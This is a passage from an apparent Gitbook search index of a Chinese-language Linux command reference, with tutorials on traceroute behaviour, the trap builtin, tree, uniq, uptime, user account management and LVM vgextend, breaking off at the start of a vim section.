是不会封的，而UDP则不同。UDP常被用来做网络攻击，因为UDP无需连接，因而没有任何状态约束它，比较方便攻击者伪造源IP、伪造目的端口发送任意多的UDP包，长度自定义。所以运营商为安全考虑，对于UDP端口常常采用白名单ACL，就是只有ACL允许的端口才可以通过，没有明确允许的则统统丢弃。比如允许DNS/DHCP/SNMP等。 总结一下，traceroute主要利用IP数据包的TTL字段值 + ICMP来实现，它发送的用于探测网络路径的数据包的IP之上的协议可以是 UDP、TCP或ICMP。不同模式下，探测过程中设计的数据包如下： UDP模式：UDP探测数据包（目标端口大于30000） + 中间网关发回 ICMP TTL 超时数据包 + 目标主机发回ICMP Destination Unreachable 数据包 TCP模式：TCP [SYN]探测数据包（目标端口为Web服务的80） + 中间网关发回 ICMP TTL 超时数据包 + 目标主机发回TCP [SYN ACK] 数据包 ICMP模式：ICMP Echo (ping) Request 探测数据包 + 中间网关发回ICMP TTL超时数据包 + 目标主机发回ICMP Echo (ping) reply 数据包 traceroute出现*的分析：源发出ICMP Request，第一个request的TTL为1，第二个request的TTL为2，以后依此递增直至第30个；中间的router送回ICMP TTL-expired ( ICMP type 11) 通知source，（packet同时因TTL超时而被drop)，由此source知晓一路上经过的每一个router；最后的destination送回ICMP Echo Reply（最后一跳不会再回ICMP TTL-expired）。所以中间任何一个router上如果封了ICMP Echo Request, traceroute就不能工作；如果封了type 11(TTL-expired), 中间的router全看不到，但能看到packet到达了最后的destination；如果封了ICMP Echo Reply，中间的全能看到，最后的destination看不到。 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 15:15:08 "},"Linux-Command/Linux_Command_trap.html":{"url":"Linux-Command/Linux_Command_trap.html","title":"Linux Command Trap","keywords":"","body":"Linux Command trap 信号捕捉1. 简介2. 语法3. 信号介绍4. 常用信号5. 命令6. 实例6.1 ctrl + c6.2 信号屏蔽和恢复6.3 debug6.4 exit6.5 return6.6 SIGINT7. 综合7.1 信号设置与恢复7.2 信号屏蔽7.3 条件动作Linux Command trap 信号捕捉 1. 简介 信号捕捉 trap，它用于捕获指定的信号并执行预定义的命令。比如，按Ctrl+C会使脚本终止执行，实际上系统发送了SIGINT信号给脚本进程，SIGINT信号的默认处理方式就是退出程序。如果要在Ctrl +C不退出程序，那么就得使用trap命令来指定一下SIGINT的处理方式了。trap命令不仅仅处理Linux信号，还能对脚本退出（EXIT）、调试（DEBUG）、错误（ERR）、返回（RETURN）等情况指定处理方式。 2. 语法 它用于捕获指定的信号并执行预定义的命令。 trap [-lp] [[arg] sigspec ...] arg：是shell命令或者自定义函数或者脚本 sigspec：可以是信号名或者数值。信号名的大小写不敏感，SIG这个前缀也是可选的。以下的命令效果一样 实例： trap \"echo trap int\" 2 trap \"echo trap int\" int trap \"echo trap int\" Int trap \"echo trap int\" INT trap \"echo trap int\" SIGINT 也可以同时写多个信号量 trap 'echo \"Press ctrl+c\"' 2 3 3. 信号介绍 通过trap -l查看类似kill -l的输出查看一共有多少信号量 $ trap -l 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL 10) SIGUSR1 11) SIGSEGV 12) SIGUSR2 13) SIGPIPE 14) SIGALRM 15) SIGTERM 16) SIGSTKFLT 17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP 21) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU 25) SIGXFSZ 26) SIGVTALRM 27) SIGPROF 28) SIGWINCH 29) SIGIO 30) SIGPWR 31) SIGSYS 34) SIGRTMIN 35) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3 38) SIGRTMIN+4 39) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+8 43) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+12 47) SIGRTMIN+13 48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-14 51) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-10 55) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7 58) SIGRTMAX-6 59) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-2 63) SIGRTMAX-1 64) SIGRTMAX trap -l 等价于执行 kill -l，发送信号请查看 kill 命令。 1) SIGHUP 本信号在用户终端连接(正常或非正常)结束时发出, 通常是在终端的控制进程结束时, 通知同一session内的各个作业, 这时它们与控制终端不再关联. 　　 2) SIGINT 程序终止(interrupt)信号, 在用户键入INTR字符(通常是Ctrl-C)时发出 　　 3) SIGQUIT 和SIGINT类似, 但由QUIT字符(通常是Ctrl-/)来控制. 进程在因收到SIGQUIT退出时会产生core文件, 在这个意义上类似于一个程序错误信号. 　　 4) SIGILL 执行了非法指令. 通常是因为可执行文件本身出现错误, 或者试图执行数据段. 堆栈溢出时也有可能产生这个信号. 　　 5) SIGTRAP 由断点指令或其它trap指令产生. 由debugger使用. 　　 6) SIGABRT 程序自己发现错误并调用abort时产生. 　　 7) SIGIOT 在PDP-11上由iot指令产生, 在其它机器上和SIGABRT一样. 　　 8) SIGBUS 非法地址, 包括内存地址对齐(alignment)出错. eg: 访问一个四个字长的整数, 但其地址不是4的倍数. 　　 9) SIGFPE 在发生致命的算术运算错误时发出. 不仅包括浮点运算错误, 还包括溢出及除数为0等其它所有的算术的错误. 　　 10) SIGKILL 用来立即结束程序的运行. 本信号不能被阻塞, 处理和忽略. 　　 11) SIGUSR1 留给用户使用 　　 12) SIGSEGV 试图访问未分配给自己的内存, 或试图往没有写权限的内存地址写数据. 　　 13) SIGUSR2 留给用户使用 　　 14) SIGPIPE Broken pipe 　　 15) SIGALRM 时钟定时信号, 计算的是实际的时间或时钟时间. alarm函数使用该信号. 　　 16) SIGTERM 程序结束(terminate)信号, 与SIGKILL不同的是该信号可以被阻塞和处理. 通常用来要求程序自己正常退出. shell命令kill缺省产生这个信号. 　　 17) SIGCHLD 子进程结束时, 父进程会收到这个信号. 　　 18) SIGCONT 让一个停止(stopped)的进程继续执行. 本信号不能被阻塞. 可以用一个handler来让程序在由stopped状态变为继续执行时完成特定的工作. 例如, 重新显示提示符 　　 19) SIGSTOP 停止(stopped)进程的执行. 注l意它和terminate以及interrupt的区别: 该进程还未结束, 只是暂停执行. 本信号不能被阻塞, 处理或忽略. 　　 20) SIGTSTP 停止进程的运行, 但该信号可以被处理和忽略. 用户键入SUSP字符时(通常是Ctrl-Z)发出这个信号 　　 21) SIGTTIN 当后台作业要从用户终端读数据时, 该作业中的所有进程会收到SIGTTIN信号. 缺省时这些进程会停止执行. 　　 22) SIGTTOU 类似于SIGTTIN, 但在写终端(或修改终端模式)时收到. 　　 23) SIGURG 有紧急数据或out-of-band数据到达socket时产生. 　　 24) SIGXCPU 超过CPU时间资源限制. 这个限制可以由getrlimit/setrlimit来读取/改变 　　 25) SIGXFSZ 超过文件大小资源限制. 　　 26) SIGVTALRM 虚拟时钟信号. 类似于SIGALRM, 但是计算的是该进程占用的CPU时间. 　　 27) SIGPROF 类似于SIGALRM/SIGVTALRM, 但包括该进程用的CPU时间以及系统调用的时间. 　　 28) SIGWINCH 窗口大小改变时发出. 　　 29) SIGIO 文件描述符准备就绪, 可以开始进行输入/输出操作. 　　 30) SIGPWR Power failure 4. 常用信号 Ctrl + c: 程序终止信号,也可以指定为2或者int EXIT：在shell退出前执行trap设置的命令，也可以指定为0 RETURN：在函数返回时，或者.和source执行其他脚本返回时，执行trap设置的命令 DEBUG：在任何命令执行前执行trap设置的命令，但对于函数仅在函数的第一条命令前执行一次 5. 命令 $ trap \"脚本或命令\" signal-list 当脚本收到signal-list清单内列出的信号时,trap命令执行双引号中的命令，而不会执行原操作 $ trap signal-list 如果没有指定命令部分，那么就将信号处理复原。比如 trap INT 就表明恢复Ctrl+C退出 $ trap \"\" signal-list 忽略信号signals，可以多个，比如 trap \"\" INT 表明忽略SIGINT信号，按Ctrl+C也不能使脚本或者命令退出。 $ trap \"-\" signal-list 恢复原信号的操作 $ trap -p 当前的trap设置打印出来 $ trap “commands” EXIT 脚本退出时执行的命令 $ trap : 2 恢复信号 6. 实例 6.1 ctrl + c Ctrl + c: 程序终止信号,也可以指定为2或者int $ trap \"echo hello\" 2 $ ^Chello $ trap \"echo apple\" 2 $ $ ^Capple $ trap \"echo help\" int $ ^Chelp $ trap -p trap -- 'echo trap 2' SIGINT trap -- '' SIGTSTP trap -- '' SIGTTIN trap -- '' SIGTTOU 6.2 信号屏蔽和恢复 trap \"\" 2 #信号屏蔽(忽略) trap : 2 #恢复信号 trap \"-\" 2 #恢复信号 $ trap 'echo \"Press ctrl+c\"' int $ trap \"\" int #信号屏蔽 $ ls #ctrl + c不会有动作反应 1.sh 2 3 c dir1 dir3 $ trap : 2 #恢复信号 $ ls^C #ctrl + c有动作反应 $ 忽略多个信号 $ trap '' 1 2 3 15 6.3 debug DEBUG：在任何命令执行前执行trap设置的命令，但对于函数仅在函数的第一条命令前执行一次 #!/bin/bash hi() { echo \"hi shuge\" } trap \"echo this is trap\" DEBUG hi hello() { echo \"hello shuge\" } hello 执行： $ bash trap_debug.sh this is trap # 在函数执行前执行trap中的命令 hi shuge this is trap # 在函数执行前执行trap中的命令 hello shuge 6.4 exit #!/bin/bash # test trap command trap \"echo Goodbye.\" EXIT #trap \"echo Goodbye.\" 0 # 与EXIT一个效果 echo This is a test script count=1 while [ $count -le 10 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done echo The end. 执行： $ bash trap_exit.sh This is a test script Loop 1 Loop 2 Loop 3 Loop 4 Loop 5 Loop 6 Loop 7 Loop 8 Loop 9 Loop 10 The end. Goodbye. #脚本退出前执行trap中指定的命令 6.5 return #!/bin/bash hi() { trap \"echo this is trap return\" return echo \"hi shuge\" echo \"hi shuge2\" } hi hello() { trap \"echo this is trap return\" return echo \"hello shuge\" } hello 执行： $ bash trap_return.sh hi shuge hi shuge2 this is trap return hello shuge this is trap return 6.6 SIGINT trap_ SIGINT.sh #!/bin/bash # test trap command trap \"echo 'Sorry! I have trapped Ctrl-C'\" SIGINT count=1 while [ $count -le 5 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done trap \"echo 'Sorry! The trap has been modified.'\" SIGINT count=1 while [ $count -le 5 ] do echo \"Loop $count\" sleep 1 count=$[ $count + 1 ] done echo The end. 执行： $ bash trap_ SIGINT.sh Loop 1 Loop 2 Loop 3 ^CSorry! I have trapped Ctrl-C Loop 4 Loop 5 Loop 1 Loop 2 Loop 3 ^CSorry! The trap has been modified. Loop 4 Loop 5 The end. 7. 综合 7.1 信号设置与恢复 trap_test_1.sh #!/bin/bash trap \"echo 'Sorry!I have trapped Ctrl+C'\" 2 echo \"This is a test script~\" count=1 while [ $count -le 3 ]; do echo \"Loop #$count\" sleep 2 count=$(($count + 1)) done echo \"This is the end of the script~\" trap - 2 ##恢复 echo \"I just removed the trap\" 执行： $ bash trap_test_1.sh This is a test script~ Loop #1 Loop #2 ^CSorry!I have trapped Ctrl+C Loop #3 This is the end of the script~ I just removed the trap 7.2 信号屏蔽 trap_test_2.sh #!/bin/bash trap 'echo \"Press ctrl+c\"' int trap -p for ((i = 0; i 执行： $ bash trap_test_2.sh trap -- 'echo \"Press ctrl+c\"' SIGINT 1 ^CPress ctrl+c # 输出信号对应的命令 2 3 trap -- '' SIGINT 4 ^C5 #屏蔽信号 6 7 ^C #恢复信号，终端进程 7.3 条件动作 执行脚本时，脚本完成后，将新建的文件全部删除掉 #!/bin/bash trap \"find /tmp -type f -name 'trap_test*' | xargs rm -f && exit \" 0 new_file(){ touch /tmp/trap_test_$(date +%F-%N-%M-%S) sleep 2 touch /tmp/trap_test_$(date +%F-%N-%M-%S) ls -l /tmp/trap_test* } new_file 执行： $ bash trap_rm.sh -rw-r--r-- 1 root root 0 Jun 28 10:22 /tmp/trap_test_2022-06-28-899109106-22-51 -rw-r--r-- 1 root root 0 Jun 28 10:22 /tmp/trap_test_2022-06-28-916718446-22-53 参考： The Bash Trap Command phoenixnap Bash trap Command Explained linuxhint Bash trap command Using Bash traps in your scripts Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-28 10:44:34 "},"Linux-Command/Linux_Command_tree.html":{"url":"Linux-Command/Linux_Command_tree.html","title":"Linux Command Tree","keywords":"","body":"Linux Command tree 树状图1. 简介2. 语法3. 实例3.1 无参数执行3.2 只显示目录3.3 显示文件大小Linux Command tree 树状图 图 1.2.87.1：在这里插入图片描述 1. 简介 Linux tree命令用于以树状图列出目录的内容。 执行tree指令，它会列出指定目录下的所有文件，包括子目录里的文件。 2. 语法 tree [-aACdDfFgilnNpqstux][-I ][-P ][目录...] 参数说明： -a 显示所有文件和目录。 -A 使用ASNI绘图字符显示树状图而非以ASCII字符组合。 -C 在文件和目录清单加上色彩，便于区分各种类型。 -d 显示目录名称而非内容。 -D 列出文件或目录的更改时间。 -f 在每个文件或目录之前，显示完整的相对路径名称。 -F 在执行文件，目录，Socket，符号连接，管道名称名称，各自加上\"*\",\"/\",\"=\",\"@\",\"|\"号。 -g 列出文件或目录的所属群组名称，没有对应的名称时，则显示群组识别码。 -i 不以阶梯状列出文件或目录名称。 -L level 限制目录显示层级。 -l 如遇到性质为符号连接的目录，直接列出该连接所指向的原始目录。 -n 不在文件和目录清单加上色彩。 -N 直接列出文件和目录名称，包括控制字符。 -p 列出权限标示。 -P 只显示符合范本样式的文件或目录名称。 -q 用\"?\"号取代控制字符，列出文件和目录名称。 -s 列出文件或目录大小。 -t 用文件和目录的更改时间排序。 -u 列出文件或目录的拥有者名称，没有对应的名称时，则显示用户识别码。 -x 将范围局限在现行的文件系统中，若指定目录下的某些子目录，其存放于另一个文件系统上，则将该子目录予以排除在寻找范围外。 3. 实例 3.1 无参数执行 tree . ├── docker │ └── volume │ └── Dockerfile ├── iptables-scripts └── wireguard ├── docker-compose │ ├── config │ │ ├── coredns │ │ │ └── Corefile │ │ ├── peer1 │ │ │ ├── peer1.conf │ │ │ ├── peer1.png │ │ │ ├── presharedkey-peer1 │ │ │ ├── privatekey-peer1 │ │ │ └── publickey-peer1 │ │ ├── server │ │ │ ├── privatekey-server │ │ │ └── publickey-server │ │ ├── templates │ │ │ ├── peer.conf │ │ │ └── server.conf │ │ └── wg0.conf │ └── docker-compose.yml └── private 9 directories, 15 files 3.2 只显示目录 tree -d . ├── docker │ └── volume └── wireguard └── docker-compose └── config ├── coredns ├── peer1 ├── server └── templates 9 directories 3.3 显示文件大小 $ tree -L 2 --du -h . ├── [ 36K] payments │ ├── [2.4K] deploy.sh │ ├── [4.0K] dist │ ├── [4.0K] lib │ ├── [4.0K] node_modules │ ├── [1.5K] package.json │ ├── [ 356] readme.md │ ├── [4.0K] src │ ├── [4.0K] test │ └── [ 406] tsconfig.json │ ...... └── [ 30K] transaction_engine ├── [2.4K] deploy.sh ├── [4.0K] dist ├── [4.0K] lib ├── [4.0K] node_modules ├── [ 570] package.json ├── [ 658] readme.md ├── [4.0K] src └── [ 397] tsconfig.json 设置别名 $ alias t=\"tree --du -h -L\" $ t 2 . ├── [ 36K] payments │ ├── [2.4K] deploy.sh │ ├── [4.0K] dist │ ├── [4.0K] lib │ ├── [4.0K] node_modules │ ├── [1.5K] package.json │ ├── [ 356] readme.md │ ├── [4.0K] src │ ├── [4.0K] test │ └── [ 406] tsconfig.json │ ...... └── [ 30K] transaction_engine ├── [2.4K] deploy.sh ├── [4.0K] dist ├── [4.0K] lib ├── [4.0K] node_modules ├── [ 570] package.json ├── [ 658] readme.md ├── [4.0K] src └── [ 397] tsconfig.json 当然显示文件大小也可以通过du $ du -ah --max-depth=2 7.5M ./payments/dist 64K ./payments/lib 74M ./payments/node_modules 28K ./payments/src 60K ./payments/test 82M ./payments ... 108K ./transaction_engine/dist 44K ./transaction_engine/lib 62M ./transaction_engine/node_modules 16K ./transaction_engine/src 0 ./transaction_engine/test 62M ./transaction_engine Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-11-14 07:56:40 "},"Linux-Command/Linux_Command_uniq.html":{"url":"Linux-Command/Linux_Command_uniq.html","title":"Linux Command Uniq","keywords":"","body":"Linux Command uniq1. 简介2. 参数3. 示例1. 重复相邻2. 重复不相邻Linux Command uniq tagsstart 文件管理 tagsstop 图 1.2.88.1：在这里插入图片描述 1. 简介 Linux uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用。 uniq 可检查文本文件中重复出现的行列 2. 参数 -c, --count 在每行开头增加重复次数。 -d, --repeated 所有邻近的重复行只被打印一次。 -D 所有邻近的重复行将全部打印。 --all-repeated[=METHOD] 类似于 -D，但允许每组之间以空行分割。METHOD取值范围{none(默认)，prepend，separate}。 -f, --skip-fields=N 跳过对前N个列的比较。 --group[=METHOD] 显示所有行，允许每组之间以空行分割。METHOD取值范围：{separate(默认)，prepend，append，both}。 -i, --ignore-case 忽略大小写的差异。 -s, --skip-chars=N 跳过对前N个字符的比较。 -u, --unique 只打印非邻近的重复行。 -z, --zero-terminated 设置行终止符为NUL（空），而不是换行符。 -w, --check-chars=N 只对每行前N个字符进行比较。 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 3. 示例 1. 重复相邻 文件testfile中第 2、3、5、6、7、9行为相同的行，使用 uniq 命令删除重复的行，可使用以下命令： $ cat testfile #原有内容 test 30 test 30 test 30 Hello 95 Hello 95 Hello 95 Hello 95 Linux 85 Linux 85 $ uniq testfile #删除重复行后的内容 test 30 Hello 95 Linux 85 检查文件并删除文件中重复出现的行，并在行首显示该行重复出现的次数。使用如下命令： $ uniq -c testfile #删除重复行后的内容 3 test 30 #前面的数字的意义为该行共出现了3次 4 Hello 95 #前面的数字的意义为该行共出现了4次 2 Linux 85 #前面的数字的意义为该行共出现了2次 2. 重复不相邻 当重复的行并不相邻时，uniq 命令是不起作用的，即若文件内容为以下时，uniq 命令不起作用： $ cat testfile1 # 原有内容 test 30 Hello 95 Linux 85 test 30 Hello 95 Linux 85 test 30 Hello 95 Linux 85 $ sort testfile1 | uniq Hello 95 Linux 85 test 30 $ sort testfile1 | uniq -c 3 Hello 95 3 Linux 85 3 test 30 $ sort testfile1 | uniq -d Hello 95 Linux 85 test 30 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:49:34 "},"Linux-Command/Linux_Command_uptime.html":{"url":"Linux-Command/Linux_Command_uptime.html","title":"Linux Command Uptime","keywords":"","body":"Linux Command uptime 系统负载简介Linux Command uptime 系统负载 tagsstart 分析 监控 tagsstop 简介 procps是一个实用程序包，主要包括ps top kill等程序主要用来显示与控制一些系统信息，进程状态之类的内容。 以下显示输入uptime的信息： $ uptime 04:03:58 up 10 days, 13:19, 1 user, load average: 0.54, 0.40, 0.20 当前时间 04:03:58 系统已运行的时间 10 days, 13:19 当前在线用户 1 user 平均负载：0.54, 0.40, 0.20，最近1分钟、5分钟、15分钟系统的负载 最直接查看系统平均负载命令 $ cat /proc/loadavg 0.10 0.06 0.01 1/72 29632 除了前3个数字表示平均进程数量外，后面的1个分数，分母表示系统进程总数，分子表示正在运行的进程数；最后一个数字表示最近运行的进程ID 何为系统负载呢？ 系统平均负载被定义为在特定时间间隔内运行队列中的平均进程数。如果一个进程满足以下条件则其就会位于运行队列中： 它没有在等待I/O操作的结果 它没有主动进入等待状态(也就是没有调用'wait') 没有被停止(例如：等待终止) 一般来说，每个CPU内核当前活动进程数不大于3，则系统运行表现良好！当然这里说的是每个cpu内核，也就是如果你的主机是四核cpu的话，那么只要uptime最后输出的一串字符数值小于12即表示系统负载不是很严重.当然如果达到20，那就表示当前系统负载非常严重，估计打开执行web脚本非常缓慢. Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 08:05:35 "},"Linux-Command/Linux_Command_user.html":{"url":"Linux-Command/Linux_Command_user.html","title":"Linux Command User","keywords":"","body":"linux Command useradd、usermod、userdel1. useradd2. usermod3. userdellinux Command useradd、usermod、userdel tagsstart 用户管理 tagsstop 1. useradd useradd 命令用来创建或更新用户信息。 -c：加上备注文字，备注文字保存在passwd的备注栏中。 -d：指定用户登入时的主目录，替换系统默认值/home/ -D：变更预设值。 -e：指定账号的失效日期，日期格式为MM/DD/YY，例如06/30/12。缺省表示永久有效。 -f：指定在密码过期后多少天即关闭该账号。如果为0账号立即被停用；如果为-1则账号一直可用。默认值为-1. -g：指定用户所属的群组。值可以使组名也可以是GID。用户组必须已经存在的，期默认值为100，即users。 -G：指定用户所属的附加群组。 -m：自动建立用户的登入目录。 -M：不要自动建立用户的登入目录。 -N: 不要创建以用户名称为名的群组。 -n：取消建立以用户名称为名的群组。 -r：建立系统账号。 -s：指定用户登入后所使用的shell。默认值为/bin/bash。 -u：指定用户ID号。该值在系统中必须是唯一的。0~499默认是保留给系统用户账号使用的，所以该值必须大于499。 1.创建用户 useradd tester1 2.-N 选项，即不要生成与用户同名的群组。查看下 /etc/passwd 文件，发现 tester2 用户的初始群组ID是100。这个100是哪来的？有ID为100的群组吗？其实100作为 -N 的默认值是写在配置文件中的。不管有没有ID为100的群组，都是这个值。当然我们也可以通过修改配置文件来改变这个默认值！ useradd tester2 -N 3.sudo 是一个非常有权势的群组， tester3 加入到这个群组 useradd tester3 -g sudo 4.添加到非初始化组 useradd tester4 -G sudo 5.创建用户的同时创建用户的家目录，必须指定 -m 选项 useradd -m tester5 6.指定家目录，但此时不生成目录 abc useradd -d /home/abc tester6 7.生成目录 abcd，并且目录下默认存在文件 useradd -d /home/abcd -m tester7 8.创建一个带有家目录并且可以登录 bash 的用户 useradd -m -s /bin/bash tester8 9.创建一个没有家目录且不能登录的用户 useradd -s /sbin/nologin tester9 10.创建时把用户加入不同的用户组 useradd -m -G xxx,sudo tester4 11.建立一个新用户账户testuser1，并设置UID为544，主目录为/usr/testuser1，属于users组： useradd -u 544 -d /usr/test1 -g users -m test11 12.新创建一个oracle用户，这初始属于oinstall组，且同时让他也属于dba组。 useradd oracle -g oinstall -G dba 2. usermod usermod命令用于修改用户的基本信息。usermod命令不允许你改变正在线上的使用者帐号名称。当usermod命令用来改变user id，必须确认这名user没在电脑上执行任何程序。 usermod(选项)(参数) 选项 -c：修改用户帐号的备注文字； $ useradd -c nihao han $ cat /etc/passwd |tail -1 han:x:2019:2019:nihao:/home/han:/bin/bash $ usermod -c hello han $ cat /etc/passwd |tail -1 han:x:2019:2019:hello:/home/han:/bin/bash 把han用户的备注信息nihao改为hello -d：修改用户登入时的目录； $ usermod -d /home/qwe han $ cat /etc/passwd |tail -1 han:x:2019:2019::/home/qwe:/bin/bash -e：修改帐号的有效期限； [root@centos6 ~]$ cat /etc/shadow |tail -1 han:!!:17549:0:99999:7::: [root@centos6 ~]$ usermod -e 3 han [root@centos6 ~]$ cat /etc/shadow |tail -1 han:!!:17549:0:99999:7::3: -f：修改在密码过期后多少天即关闭该帐号； [root@centos6 ~]$ usermod -f 4 han [root@centos6 ~]$ cat /etc/shadow |tail -1 han:!!:17549:0:99999:7:4:3: -g：修改用户所属的群组； [root@centos6 ~]$ usermod -g yingyu han [root@centos6 ~]$ id han uid=2019(han) gid=506(yingyu) groups=506(yingyu) -G；修改用户所属的附加群组； [root@centos6 ~]$ usermod -G shuxue han [root@centos6 ~]$ id han uid=2019(han) gid=506(yingyu) groups=506(yingyu),2020(shuxue) -l：修改用户帐号名称； [root@centos6 ~]$ usermod -l xiaoming han [root@centos6 ~]$ cat /etc/passwd |tail -1 xiaoming:x:2019:506::/home/qwe:/bin/bash [root@centos6 ~]$ id xiaoming uid=2019(xiaoming) gid=506(yingyu) groups=506(yingyu),2020(shuxue) -L：锁定用户密码，使密码无效； [root@centos6 ~]$ usermod -L xiaoming [root@centos6 ~]$ su lilei [lilei@centos6 root]$ su xiaoming Password: su: incorrect password -s：修改用户登入后所使用的shell； [root@centos6 ~]$ usermod -s /bin/sh xiaoming [root@centos6 ~]$ cat /etc/passwd |tail -1 xiaoming:x:2019:506::/home/qwe:/bin/sh -u：修改用户ID； [root@centos6 ~]$ usermod -u 1995 xiaoming [root@centos6 ~]$ cat /etc/passwd |tail -1 xiaoming:x:1995:506::/home/qwe:/bin/sh -U:解除密码锁定。 [root@centos6 /home]$ usermod -U xiaoming [root@centos6 /home]$ su lilei [lilei@centos6 home]$ su xiaoming Password: [xiaoming@centos6 home]$ 3. userdel userdel命令用于删除给定的用户，以及与用户相关的文件。若不加选项，则仅删除用户帐号，而不删除相关文件。 语法 userdel(选项)(参数) 选项 -f：强制删除用户，即使用户当前已登录； [root@centos6 ~]$ userdel wangcai userdel: user wangcai is currently used by process 2727 [root@centos6 ~]$ cat /etc/passwd|tail -1 wangcai:x:2019:2021::/home/wangcai:/bin/bash [root@centos6 ~]$ userdel -f wangcai userdel: user wangcai is currently used by process 2727 [root@centos6 ~]$ cat /etc/passwd|tail -1 han:x:2018:2018::/home/han:/bin/bash -r：删除用户的同时，删除与用户相关的所有文件。 [root@centos6 ~]$ ls /home/ lilei wangcai [root@centos6 ~]$ userdel -r lilei [root@centos6 ~]$ ls /home/ wangcai 刚才删除wangcai这个用户时没有加-r参数所以还保存有它的家目录，加-r用户lilei家目录就没了 请不要轻易用-r选项；他会删除用户的同时删除用户所有的文件和目录，切记如果用户目录下有重要的文件，在删除前请备份。 其实也有最简单的办法，但这种办法有点不安全，也就是直接在/etc/passwd中删除您想要删除用户的记录；但最好不要这样做，/etc/passwd是极为重要的文件，可能您一不小心会操作失误。 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 16:12:42 "},"Linux-Command/Linux_Command_vgextend.html":{"url":"Linux-Command/Linux_Command_vgextend.html","title":"Linux Command Vgextend","keywords":"","body":"Linux Command vgextend 扩展卷组1. 简介2. 什么是 LVM？3. Creating Physical Volumes4. Creating Volume Groups5. extend Volume GroupsLinux Command vgextend 扩展卷组 tagsstart 设备 tagsstop 图 1.2.91.1：在这里插入图片描述 1. 简介 在 Linux 中使用逻辑卷管理 (LVM) 为用户提供了创建和使用分区的灵活性。您可以轻松地创建、修改、调整大小和删除各种存储卷。 您可以使用vgextend命令通过物理卷扩展卷组来轻松调整其大小。该命令很简单，只需在使用 vgextend 命令时添加物理卷作为参数即可。 2. 什么是 LVM？ LVM 是一个 Linux 系统，负责管理 Linux 系统中的文件系统和逻辑卷。尽管 Linux 中还有其他卷管理工具，但还是推荐使用 LVM 的高级功能。正如我们将在本指南中看到的那样，您可以使用此命令行工具实现很多目标。 为了更好地理解如何使用vgextend命令，我们将创建两个物理卷和一个卷组。完成后，我们将使用 vgextend 将一个物理卷添加到另一个物理卷的卷组中。 3. Creating Physical Volumes 图 1.2.91.2：在这里插入图片描述 我们目前没有物理卷。我们需要一个块设备来初始化物理卷。我们可以使用以下命令列出块设备： $ pvs $ sudo lvmdiskscan 图 1.2.91.3：在这里插入图片描述 由于我们需要创建两个物理卷，我们将使用/dev/sda1和/dev/sdb1。但在此之前，我们必须卸载块设备。 要卸载块设备，请使用以下命令并替换块设备以匹配您的情况： $ sudo umount /dev/sda1 $ sudo umount /dev/sdb1 卸载块设备后，我们可以继续使用pvcreate命令来初始化物理卷。 要创建两个物理卷，以下命令将是： $ sudo pvcreate /dev/sda1 $ sudo pvcreate /dev/sdb1 图 1.2.91.4：在这里插入图片描述 4. Creating Volume Groups 我们需要一个物理卷来创建卷组。让我们首先使用以下命令验证两个物理卷中没有卷组： $ sudo vgs 我们现在可以继续为其中一个物理卷创建一个卷组，我们将通过向其中添加另一个物理卷来扩展其大小。因此，要为/dev/sdb1创建卷组，以下命令将是： $ sudo vgcreate volgroup1 /dev/sdb1 我们将卷组命名为volgroup。我们可以使用 vgs 命令验证它。 要获取有关创建的卷组的更多详细信息，请使用以下vgdisplay命令： $ vgdisplay volgroup1 5. extend Volume Groups 我们需要关注的是卷组的Free PE大小。我们目前有1919 免费 PE。要扩展这个大小，我们可以使用vgextend命令并添加我们其他物理卷的名称/dev/sda1作为参数。 以下命令将是： $ vgextend volgroup1 /dev/sda1 您应该会收到与上图中类似的成功消息，确认卷组已成功扩展。我们可以验证新的大小，如下所示： 您可以注意到我们新的免费 PE 大小从1919扩展到2046。这就是您可以轻松使用 vgextend Linux 命令通过添加物理卷来扩展卷组大小的方式。 参考： Working With Vgextend Linux Command Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-11-14 07:53:21 "},"Linux-Command/Linux_Command_vim.html":{"url":"Linux-Command/Linux_Command_vim.html","title":"Linux Command Vim","keywords":"","body":"Linux Command vim 文本编辑器1. 编辑多文件1.1 在同一窗口中打开多个文件1.2 在不同窗口中打开多个文件：1.3 窗口分割实现编辑多文件2. 编辑命令2.1 vim模式：2.2 打开文件2.3 关闭文件2.4 移动光标(编辑模式)2.5 翻屏2.6 删除2.7 粘贴命令 p2.8 复制命令 y2.9 修改：先删除内容，再转换为输入模式2.10 替换：2.11 撤消编辑操作 u2.12 重复前一次编辑操作2.13 可视化模式2.14 查找2.15 查找并替换2.16 使用vim编辑多个文件2.17 分屏显示一个文件2.18 分窗口编辑多个文件2.19 将当前文件中部分内容另存为另外一个文件2.20 将另外一个文件的内容填充在当前文件中2.21 跟shell交互2.22 快速翻页3 显示格式设置3.1 显示或取消显示行号3.2 显示忽略或区分字符大小写3.3 设定自动缩进3.4 查找到的文本高亮显示或取消3.5 语法高亮4 配置文件实例15 多行处理5.1 